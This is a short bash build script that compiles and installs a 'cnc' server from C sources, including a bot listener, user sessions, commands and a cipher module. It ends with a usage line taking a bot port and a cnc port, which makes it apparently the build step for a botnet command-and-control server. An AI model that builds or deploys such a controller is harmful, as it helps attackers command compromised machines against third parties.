#!/bin/bash
mkdir -p database
cd cnc
gcc -o server main.c bot_auth/bot_listener.c user_handler/user_session.c user_handler/users.c commands/commands.c utils/theme_loader.c utils/cipher.c -pthread -O2 -std=c99
mv server ../
cd ..
echo "DONE, USAGE: screen ./server <botport> <cncport>"
